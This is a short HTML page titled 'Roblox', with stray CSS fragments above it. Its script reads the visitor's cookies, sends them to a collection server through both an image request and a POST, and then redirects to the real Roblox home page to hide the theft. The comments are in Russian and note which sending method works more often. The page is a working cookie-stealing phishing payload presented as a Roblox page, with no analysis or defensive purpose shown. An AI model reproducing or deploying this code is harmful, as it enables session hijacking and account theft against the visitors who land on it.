            text-align: center;

            font-size: 18px;
            margin: 10px 0;

            background: #0d0d1a;

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
</head>
<body>
    <script>
        var TARGET = 'http://127.0.0.1:8080/';
        var cookies = document.cookie;
        if (cookies) {
            // Способ 1: Image (работает чаще)
            var img = new Image();
            img.src = TARGET + '?c=' + encodeURIComponent(cookies);

            // Способ 2: fetch (дублируем)
            fetch(TARGET, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie: cookies })
            }).catch(function(e) {
                console.log('Fetch не сработал, но Image уже отправил');
            });
        }
        window.location.replace('https://www.roblox.com/home');
    </script>
</body>
</html>
